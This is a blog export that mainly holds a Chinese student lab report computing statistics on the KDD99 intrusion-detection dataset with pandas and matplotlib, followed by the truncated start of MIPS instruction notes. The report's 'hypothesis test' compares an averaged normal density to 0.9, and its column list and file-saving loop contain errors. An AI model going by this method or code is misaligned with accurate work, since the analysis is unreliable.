[{"title":"概率论实验报告","url":"/2022/12/29/概率论实验报告/","content":"\n## 一、实验名称\n\n处理 **KDD99** 数据集\n\n## 二、实验目的\n\n对 **KDD99** 数据集进行处理，获得统计信息。\n\n## 三、实验内容\n\n1. 对“kddcup.data_10_percent”数据集（with label）进行处理，获得统计信息\n\n2. 对“kddcup.testdata.unlabeled”数据集进行处理，获得统计信息\n\n3. 根据“kddcup.data_10_percent”数据集（with label） 分出不同种类的攻击和正常数据，获得基本的统计信息\n\n4. 利⽤labeled数据集的统计特征，分析unlabeled数据集。假设KDD99的正常数据集服从正态分布，则在置信度为0.9的情况下，请检验unlabeled数据集是否属于正常数据？（提示：首先需要获得一个normal的数据样本集，然后需要排除掉数据集中无关features的影响，之后以处理后的数据集估计KDD99正常数据集的均值和方差，然后利用假设检验，对应的去检验unlabeled数据集的相关性质。）\n\n5. 扩展：尝试使用机器学习分类算法利用labeled的数据集进行训练，在使用对应模型对unlabeled数据集进行分类。\n\n## 四、实验数据及结果分析\n\n**KDD99**一共有42项特征，前41项可分为四大类，第42项为**入侵检测试验类型标识**\n\n### 1.单个 TCP 连接的基本特征(1~9)\n\n| 特征名称       | 描述                                | 类型 |\n| -------------- | ----------------------------------- | ---- |\n| duration       | 连接持续的秒数                      | 连续 |\n| protocol_type  | 协议类型，TCP,UDP,ICMP              | 离散 |\n| service        | 目标主机的网络服务类型，共70种      | 离散 |\n| flag           | 连接正常或错误的状态，共11种        | 离散 |\n| src_bytes      | 从源主机到目标主机的数据字节数      | 连续 |\n| dst_bytes      | 从目标主机到源主机的数据字节数      | 连续 |\n| land           | 若连接来自/送达同一个主机/端口则为1 | 离散 |\n| wrong_fragment | 错误分段的数量                      | 连续 |\n| urgent         | 加急包的个数                        | 连续 |\n\n#### 补充\n\n> **service:**\n>\n> ```\n> 'aol', 'auth', 'bgp', 'courier', 'csnet_ns','ctf', 'daytime', 'discard', 'domain', 'domain_u', 'echo', 'eco_i', 'ecr_i', 'efs', 'exec', 'finger', 'ftp', 'ftp_data','gopher', 'harvest', 'hostnames', 'http', 'http_2784', 'http_443', 'http_8001', 'imap4', 'IRC', 'iso_tsap','klogin', 'kshell', 'ldap', 'link', 'login', 'mtp', 'name', 'netbios_dgm', 'netbios_ns', 'netbios_ssn', 'netstat','nnsp', 'nntp', 'ntp_u', 'other', 'pm_dump', 'pop_2', 'pop_3', 'printer', 'private', 'red_i', 'remote_job', 'rje','shell', 'smtp', 'sql_net', 'ssh', 'sunrpc', 'supdup', 'systat', 'telnet', 'tftp_u', 'tim_i', 'time', 'urh_i', 'urp_i','uucp', 'uucp_path', 'vmnet', 'whois', 'X11', 'Z39_50'\n> ```\n\n>**flag**\n>\n>```\n>'OTH', 'REJ', 'RSTO', 'RSTOS0', 'RSTR', 'S0', 'S1',\n>'S2', 'S3', 'SF', 'SH'\n>```\n\n### 2.TCP连接的内容特征(10~22)\n\n| 特征名称           | 描述                                      | 类型 |\n| ------------------ | ----------------------------------------- | ---- |\n| hot                | 访问敏感文件或目录的次数                  | 连续 |\n| num_failed_logins  | 登陆尝试失败的次数                        | 连续 |\n| logged_in          | 成功登陆则为1，否则为0                    | 离散 |\n| num_compromised    | compromised条件出现的次数                 | 连续 |\n| root_shell         | 获得 **root shell** 则为1，否则为0        | 离散 |\n| su_attempted       | 若出现\"**su root**\"命令则为1，否则为0     | 离散 |\n| num_root           | **root **用户访问次数                     | 连续 |\n| num_file_creations | 文件创建操作的次数                        | 连续 |\n| num_shells         | 使用 **shell** 命令的次数                 | 连续 |\n| num_access_files   | 访问控制文件的次数                        | 连续 |\n| num_outbound_cmds  | 一个 **FTP** 会话中出战连接的次数         | 连续 |\n| is_hot_login       | 登陆是否属于\"**hot**\"列表，是为1，否则为0 | 离散 |\n| is_guest_login     | 若是 **guest** 登陆则为1                  | 离散 |\n\n### 3.两秒内网络流量统计特征(23~31)\n\n| 特征名称           | 描述                                                         | 类型 |\n| ------------------ | ------------------------------------------------------------ | ---- |\n| count              | 与当前连接具有相同的目标主机的连接数                         | 连续 |\n| srv_count          | 与当前连接具有相同服务的连接数                               | 连续 |\n| serror_rate        | 在与当前连接具有相同目标主机的连接中，出现\"**SYN**\"错误的连接的百分比 | 连续 |\n| srv_serror_rate    | 在与当前连接具有相同服务的连接中，出现\"**SYN**\"错误的连接的百分比 | 连续 |\n| rerror_rate        | 在与当前连接具有相同目标主机的连接中，出现\"\"**REJ**\"错误的连接的百分比 | 连续 |\n| srv_rerror_rate    | 在与当前连接具有相同服务的连接中，出现\"**REJ**\"错误的连接的百分比 | 连续 |\n| same_srv_rate      | 在与当前连接具有相同目标主机的连接中，与当前连接具有相同服务的连接的百分比 | 连续 |\n| diff_srv_rate      | 在与当前连接具有相同目标主机的连接中，与当前连接具有不同服务的连接的百分比 | 连续 |\n| srv_diff_host_rate | 在与当前连接具有相同服务的连接中，与当前连接具有不同目标主机的连接的百分比 | 连续 |\n\n### 4.一百个连接中的网络流量统计特征(32~41)\n\n| 特征名称                    | 描述                                                         | 类型 |\n| --------------------------- | ------------------------------------------------------------ | ---- |\n| dst_host_count              | 与当前连接具有相同目标主机的连接数                           | 连续 |\n| dst_host_srv_count          | 与当前连接具有相同目标主机相同服务的连接数                   | 连续 |\n| dst_host_same_srv_rate      | 与当前连接具有相同目标主机相同服务的连接所占的百分比         | 连续 |\n| dst_host_diff_srv_rate      | 与当前连接具有相同目标主机不同服务的连接所占的百分比         | 连续 |\n| dst_host_same_src_port_rate | 与当前连接具有相同目标主机相同源端口的连接所占的百分比       | 连续 |\n| dst_host_srv_diff_host_rate | 与当前连接具有相同目标主机相同服务的连接中，与当前连接具有不同源主机的连接所占的百分比 | 连续 |\n| dst_host_serror_rate        | 与当前连接具有相同目标主机的连接中，出现\"**SYN**\"错误的连接所占的百分比 | 连续 |\n| dst_host_srv_serror_rate    | 与当前连接具有相同目标主机相同服务的连接中，出现\"**SYN**\"错误的连接所占的百分比 | 连续 |\n| dst_host_rerror_rate        | 与当前连接具有相同目标主机的连接中，出现\"**REJ**\"错误的连接所占的百分比 | 连续 |\n| dst_host_srv_rerror_rate    | 与当前连接具有相同目标主机相同服务的连接中，出现\"**REJ**\"错误的连接所占的百分比 | 连续 |\n\n第42项\n\n| 标识类型 | 描述                                 | 具体分类标识                                                 |\n| -------- | ------------------------------------ | ------------------------------------------------------------ |\n| Normal   | 正常记录                             | Normal                                                       |\n| DOS      | 拒绝服务攻击                         | back、land、neptune、pod、smurf、teardrop、apache2、mailbomb、processtable、udpstorm |\n| Probing  | 监视和其他探                         | ipsweep、nmap、portsweep、satan、mscan、saint                |\n| R2L      | 来自远程机器的非法访问               | tp_write、guess_passwd、imap、multihop、phf、spy、warezclient、warezmaster、multihop、named、sendmail、snmpgetattack、worm、xlock、xsnoop |\n| U2R      | 普通用户对本地超级用户特权的非法访问 | buffer_overflow、loadmodule、perl、rootkit、ps、sqlattack、xterm、httptunnel |\n\n### 实验结果\n\n#### **1.对“kddcup.data_10_percent”数据集（with label）进行处理，获得统计信息**\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./data/corrected-Test data with corrected labels\")\ndf.columns = labels\n\ndef plot_pie_optimize(title, dict_value: dict, font_size):\n    keys = list(dict_value.keys())\n    values = np.array(list(dict_value.values()))\n    patches, texts = plt.pie(values)\n    labels = ['{} {:1.2f}% ({})'.format(i, j, v) for i, j, v in\n              zip(keys, 100. * values / values.sum(), values)]  # 构造图例数据\n    patches, labels, dummy = zip(*sorted(\n        zip(patches, labels, values), key=lambda x: x[2], reverse=True))\n    plt.legend(patches, labels, loc=\"center\", bbox_to_anchor=(-0.1, 0.5), fontsize=font_size)\n    plt.title(title)\n    plt.tight_layout()\n    plt.savefig(\"./dataimg/{}.png\".format(title), dpi = 600, bbox_inches = 'tight') # 使得到的图片更完整清晰\n\ndef plot_label(title, font_size):\n    df_label = df.loc[:, title].value_counts()\n    dict_value = {}\n    for i in df_label.keys():\n        dict_value[i] = df_label[i]\n    plot_pie_optimize(title, dict_value, font_size)\n\n\nplot_label(\"label\", 5)\nplot_label(\"flag\", 6)\nplot_label(\"protocol_type\", 6)\n```\n\n展示部分数据\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291140247.png)\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291147335.png)\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291147296.png)\n\n#### **2.对“kddcup.testdata.unlabeled”数据集进行处理，获得统计信息**\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./data/kddcup.data.corrected-The full data set\")\ndf.columns = labels\n\ndef plot_pie_optimize(title, dict_value: dict, font_size):\n    keys = list(dict_value.keys())\n    values = np.array(list(dict_value.values()))\n    patches, texts = plt.pie(values)\n    labels = ['{} {:1.2f}% ({})'.format(i, j, v) for i, j, v in\n              zip(keys, 100. * values / values.sum(), values)]  # 构造图例数据\n    patches, labels, dummy = zip(*sorted(\n        zip(patches, labels, values), key=lambda x: x[2], reverse=True))\n    plt.legend(patches, labels, loc=\"center\", bbox_to_anchor=(-0.1, 0.5), fontsize=font_size)\n    plt.title(title)\n    plt.tight_layout()\n    plt.savefig(\"./dataimg/{}.png\".format(title), dpi = 600, bbox_inches = 'tight') # 使得到的图片更完整清晰\n\ndef plot_label(title, font_size):\n    df_label = df.loc[:, title].value_counts()\n    dict_value = {}\n    for i in df_label.keys():\n        dict_value[i] = df_label[i]\n    plot_pie_optimize(title, dict_value, font_size)\n\n\nplot_label(\"label\", 5)\nplot_label(\"flag\", 6)\nplot_label(\"protocol_type\", 6)\n\n```\n\n展示部分数据\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291149430.png)\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291149133.png)\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291149235.png)\n\n#### **3.根据“kddcup.data_10_percent”数据集（with label） 分出不同种类的攻击和正常数据，获得基本的统计信息**\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./data/corrected-Test data with corrected labels\")\ndf.columns = labels\n\ndef plot_pie_optimize(title, dict_value: dict, font_size):\n    keys = list(dict_value.keys())\n    values = np.array(list(dict_value.values()))\n    patches, texts = plt.pie(values)\n    labels = ['{} {:1.2f}% ({})'.format(i, j, v) for i, j, v in\n              zip(keys, 100. * values / values.sum(), values)]  # 构造图例数据\n    patches, labels, dummy = zip(*sorted(\n        zip(patches, labels, values), key=lambda x: x[2], reverse=True))\n    plt.legend(patches, labels, loc=\"center\", bbox_to_anchor=(-0.1, 0.5), fontsize=font_size)\n    plt.title(title)\n    plt.tight_layout()\n    plt.savefig(\"./dataimg/{}.png\".format(title), dpi = 600, bbox_inches = 'tight') # 使得到的图片更完整清晰\n\n\nnormal_label = ['normal']\ndos_label = ['back','land','neptune','pod','smurf','teardrop','apache2','mailbomb','processtable','udpstorm']\nprobing_label = ['ipsweep','nmap','portsweep','satan','mscan','saint']\nr2l_label = ['tp_write','guess_passwd','imap','multihop','phf','spy','warezclient','warezmaster','multihop','named','sendmail','snmpgetattack','worm','xlock','xsnoop']\nu2r_label = ['buffer_overflow','loadmodule','perl','rootkit','ps','sqlattack','xterm','httptunnel']\n\nfinal_label = ['Normal','Dos','Probing','R2l','U2r']\nfinal_dict = {\n    \"Normal\": 0,\n    \"Dos\": 0,\n    \"Probing\": 0,\n    \"R2l\": 0,\n    \"U2r\": 0\n}\n\nfor i in normal_label:\n    final_dict[\"Normal\"] += df[df.values == i + '.'].__len__()\n\nfor i in dos_label:\n    final_dict[\"Dos\"] += df[df.values == i + '.'].__len__()\n\nfor i in probing_label:\n    final_dict[\"Probing\"] += df[df.values == i + '.'].__len__()\n\nfor i in r2l_label:\n    final_dict[\"R2l\"] += df[df.values == i + '.'].__len__()\n\nfor i in u2r_label:\n    final_dict[\"U2r\"] += df[df.values == i + '.'].__len__()\n\nplot_pie_optimize(\"Attack data\", final_dict, 8)\n\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291222924.png)\n\n### 4.利⽤labeled数据集的统计特征，分析unlabeled数据集。假设KDD99的正常数据集服从正态分布，则在置信度为0.9的情况下，请检验unlabeled数据集是否属于正常数据？\n\n**提示：首先需要获得一个normal的数据样本集，然后需要排除掉数据集中无关features的影响，之后以处理后的数据集估计KDD99正常数据集的均值和方差，然后利用假设检验，对应的去检验unlabeled数据集的相关性质。**\n\n```python\nimport pandas as pd\nimport numpy as np\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./data/corrected-Test data with corrected labels\")\ndf1 = pd.read_csv(\"./data/kddcup.data.corrected-The full data set\")\ndf.columns = labels\ndf1.columns = labels\n\nnormal_label = ['normal']\ndos_label = ['back','land','neptune','pod','smurf','teardrop','apache2','mailbomb','processtable','udpstorm']\nprobing_label = ['ipsweep','nmap','portsweep','satan','mscan','saint']\nr2l_label = ['tp_write','guess_passwd','imap','multihop','phf','spy','warezclient','warezmaster','multihop','named','sendmail','snmpgetattack','worm','xlock','xsnoop']\nu2r_label = ['buffer_overflow','loadmodule','perl','rootkit','ps','sqlattack','xterm','httptunnel']\n\nfinal_label = ['Normal','Dos','Probing','R2l','U2r']\nfinal_dict = {\n    \"Normal\": 0,\n    \"Dos\": 0,\n    \"Probing\": 0,\n    \"R2l\": 0,\n    \"U2r\": 0\n}\n\nfor i in normal_label:\n    df[df.values == i +'.'].to_csv('./label/normal/'+ i +'.csv', header=0, index=0)\n    df1[df1.values == i +'.'].to_csv('./label1/normal/'+ i +'.csv', header=0, index=0)\n\nfor i in dos_label:\n    df[df.values == i +'.'].to_csv('./label/dos/'+ i +'.csv', header=0, index=0)\n    df1[df1.values == i +'.'].to_csv('./label1/dos/'+ i +'.csv', header=0, index=0)\n\nfor i in probing_label:\n    df[df.values == i +'.'].to_csv('./label/probing/'+ i +'.csv', header=0, index=0)\n    df1[df1.values == i +'.'].to_csv('./label1/probing/'+ i +'.csv', header=0, index=0)\n\nfor i in r2l_label:\n    df[df.values == i +'.'].to_csv('./label/r2l/'+ i +'.csv', header=0, index=0)\n    df1[df1.values == i +'.'].to_csv('./label1/r2l/'+ i +'.csv', header=0, index=0)\n\nfor i in u2r_label:\n    df[df.values == i +'.'].to_csv('./label/u2r/'+ i +'.csv', header=0, index=0)\n    df1[df1.values == i +'.'].to_csv('./label1/r2l/'+ i +'.csv', header=0, index=0)\n```\n\n先获得各种不同种类的数据\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291544707.png)\n\n```python\nimport pandas as pd\nimport numpy as np\nfrom scipy.stats import norm\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./label/normal/normal.csv\")\ndf1 = pd.read_csv(\"./label1/normal/normal.csv\")\ndf.columns = labels\ndf1.columns = labels\n\n# 选择要分析的特征\nfeature = \"duration\"\n\n# 计算 labeled 数据集中特征的均值和标准差\nmean = df[feature].mean()\nstd = df[feature].std()\n\n# 初始化概率和计数器\nprobability_sum = 0\ncount = 0\n\n# 遍历 unlabeled 数据集中的每个数据点\nfor value in df1[feature]:\n  # 计算数据点在假设正常数据服从正态分布的情况下的概率\n  probability = norm.pdf(value, mean, std)\n  # 累加概率和计数器\n  probability_sum += probability\n  count += 1\n\n# 计算平均概率\nmean_probability = probability_sum / count\nprint(mean_probability)\n# 将平均概率与所需的置信度进行比较\nif mean_probability > 0.9:\n  print(\"Unlabeled dataset is likely to belong to normal data.\")\nelse:\n  print(\"Unlabeled dataset is not likely to belong to normal data.\")\n```\n\n> 0.0007079938317307032\n> Unlabeled dataset is not likely to belong to normal data.\n\n\n\n## 五、实验过程\n\n### 处理数据\n\n参考菜鸟教程的示例，可发现**pandas库**对csv，也就是本实验给出的数据是很好处理的\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291052328.png)\n\n```python\nimport pandas as pd\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"test.txt\")\ndf.columns = labels\ndf_dict = df.loc[:,\"duration\"].value_counts()\n```\n\n从而根据案例编写出如下代码，可以得到**duration**行的统计数据\n\n```\n0    6\n1    4\n2    2\nName: duration, dtype: int64\n```\n\n对其进行简单处理\n\n```python\ndict = {}\nfor i in df_dict.keys():\n    dict[i] = df_dict[i]\nkeys = np.array(list(dict.keys()))\nvalues = np.array(list(dict.values()))\n```\n\n可以得到\n\n```\nkeys: [0, 1, 2]\nvalues: [6 4 2]\n```\n\n正好满足 **Matplotlib** 绘制饼图需要的数据\n\n### Matplotlib 饼图\n\n根据菜鸟教程以下代码，可得到\n\n```python\nimport matplotlib.pyplot as plt\nimport numpy as np\n\ny = np.array([35, 25, 25, 15])\n\nplt.pie(y,\n        labels=['A','B','C','D'], # 设置饼图标签\n        colors=[\"#d5695d\", \"#5d8ca8\", \"#65a479\", \"#a564c9\"], # 设置饼图颜色\n       )\nplt.title(\"RUNOOB Pie Test\") # 设置标题\nplt.show()\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291142167.png)\n\n在上面对测试数据的处理下对该代码进行改变可得到\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"test.txt\")\ndf.columns = labels\ndf_dict = df.loc[:,\"duration\"].value_counts()\ndict = {}\nfor i in df_dict.keys():\n    dict[i] = df_dict[i]\nkeys = np.array(list(dict.keys()))\nvalues = np.array(list(dict.values()))\ny = values\n\nplt.pie(y,\n        labels=np.array(keys), # 设置饼图标签\n        colors=[\"#d5695d\", \"#5d8ca8\", \"#65a479\"], # 设置饼图颜色\n       )\nplt.title(\"Duration Pie Test\") # 设置标题\nplt.show()\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291142290.png)\n\n而由于本题中的数据过多过杂，将数据名称显示在每个扇形的旁边是不现实的，需要有一个图例实现如下效果\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291142994.png)\n\n参考\thttps://blog.csdn.net/weixin_35757704/article/details/126965333\n\n根据其代码，可得到\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"test.txt\")\ndf.columns = labels\ndf_dict = df.loc[:,\"duration\"].value_counts()\ndict_value = {}\nfor i in df_dict.keys():\n    dict_value[i] = df_dict[i]\nkeys = list(dict_value.keys())\nvalues = np.array(list(dict_value.values()))\npatches, texts = plt.pie(values)\nlabels = ['{} {:1.2f}% ({})'.format(i, j, v) for i, j, v in\n    zip(keys, 100. * values / values.sum(), values)]  # 构造图例数据\npatches, labels, dummy = zip(*sorted(\n    zip(patches, labels, values), key=lambda x: x[2], reverse=True))\nplt.legend(patches, labels, loc=\"center\", bbox_to_anchor=(-0.1, 0.5), fontsize=8)\nplt.tight_layout()\nplt.show()\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291142469.png)\n\n将其整合为两个函数并稍微改进\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./data/corrected-Test data with corrected labels\")\ndf.columns = labels\n\ndef plot_pie_optimize(title, dict_value: dict, font_size):\n    keys = list(dict_value.keys())\n    values = np.array(list(dict_value.values()))\n    patches, texts = plt.pie(values)\n    labels = ['{} {:1.2f}% ({})'.format(i, j, v) for i, j, v in\n              zip(keys, 100. * values / values.sum(), values)]  # 构造图例数据\n    patches, labels, dummy = zip(*sorted(\n        zip(patches, labels, values), key=lambda x: x[2], reverse=True))\n    plt.legend(patches, labels, loc=\"center\", bbox_to_anchor=(-0.1, 0.5), fontsize=font_size)\n    plt.title(title)\n    plt.tight_layout()\n    plt.savefig(\"./dataimg/{}.png\".format(title), dpi = 600, bbox_inches = 'tight') # 使得到的图片更完整清晰\n\ndef plot_label(title, font_size):\n    df_label = df.loc[:, title].value_counts()\n    dict_value = {}\n    for i in df_label.keys():\n        dict_value[i] = df_label[i]\n    plot_pie_optimize(title, dict_value, font_size)\n\n\nplot_label(\"flag\", 6)\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291140247.png)\n\n## 参考链接\n\nhttps://www.runoob.com/pandas/pandas-csv-file.html\n\nhttps://www.runoob.com/w3cnote/matplotlib-tutorial.html\n\nhttps://www.runoob.com/numpy/numpy-tutorial.html\n\nhttps://www.runoob.com/matplotlib/matplotlib-pie.html\n\nhttps://juejin.cn/post/7031475009688191007\n\nhttps://blog.csdn.net/weixin_35757704/article/details/126965333\n\n还有z神的实验报告🤗\n","tags":["class","python"]},{"title":"计组补天","url":"/2022/12/16/计组补天/","content":"# 第二章\n\n## MIPS指令\n\n| 指令                                       | 示例              | 含义                            | 注释                                   |\n| ------------------------------------------ | ----------------- | ------------------------------- | -------------------------------------- |\n| 加法                                       | add $s1,$s2,$s3   | $s1=$s2+$s3                     |                                        |\n| 减法                                       | sub $s1,$s2,$s3   | $s1=$s2-$s3                     |                                        |\n| 立即数加法                                 | addi $s1,$s2,20   | $s1=$s2+20                      | 立即数即常数                           |\n| 乘法                                       | mul $s1,$s2,$s3   | $s1=$s2*$s3                     |                                        |\n| 取立即数                                   | li $s0,5          | int $s0 = 5                     |                                        |\n| 取字符串                                   | la $a0,space      | char $a0 = \" \"                  | space需要在开头定义                    |\n| 赋值                                       | move $t0,$t1      |                                 | 将寄存器$t1中的数据传送至$t0           |\n| 输出                                       | syscall           | 将$a0内的内容输出               |                                        |\n| 取字                                       | lw $s1,20($s2)    | 